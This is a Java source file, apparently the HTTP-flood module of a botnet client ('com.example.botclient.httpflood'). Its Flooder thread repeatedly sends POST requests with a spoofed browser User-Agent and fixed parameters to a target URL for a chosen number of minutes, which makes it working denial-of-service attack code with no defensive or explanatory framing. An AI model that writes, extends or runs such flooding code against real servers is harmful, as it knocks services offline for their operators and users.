package com.example.botclient.httpflood;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;

public class HttpFlood
{
    public static class Flooder implements Runnable
    {
        private String targetUrl;
        private int attackMinutes;

        public Flooder(String targetUrl, int attackMinutes)
        {
            this.targetUrl = targetUrl;
            this.attackMinutes = attackMinutes;
        }

        @Override
        public void run()
        {
            final String USER_AGENT = "Chrome/72.0.3626.121";
            final long NANOSEC_PER_SEC = 1000l*1000*1000;
            long startTime = System.nanoTime();

            while ( (System.nanoTime()-startTime)< attackMinutes*60*NANOSEC_PER_SEC)
            {
                try
                {
                    URL url = new URL(targetUrl);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    //add reuqest header
                    connection.setRequestMethod("POST");
                    connection.setRequestProperty("User-Agent", USER_AGENT);
                    connection.setRequestProperty("Accept-Language", "en-US,en;q=0.5");

                    String urlParameters = "sn=C02G8416DRJM&cn=&locale=&caller=&num=12345";

                    // Send post request
                    connection.setDoOutput(true);
                    DataOutputStream wr = new DataOutputStream(connection.getOutputStream());
                    wr.writeBytes(urlParameters);
                    wr.flush();
                    wr.close();

                    int responseCode = connection.getResponseCode();
                    System.out.println("\nSending 'POST' request to URL : " + url);
                    System.out.println("Post parameters : " + urlParameters);
                    System.out.println("Response Code : " + responseCode);

                    BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                    String inputLine;
                    StringBuffer response = new StringBuffer();

                    while ((inputLine = in.readLine()) != null)
                    {
                        response.append(inputLine);
                    }
                    in.close();

                    //print result
                    System.out.println(response.toString());

                } catch (MalformedURLException e) {
                    e.printStackTrace();
                }catch (ProtocolException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}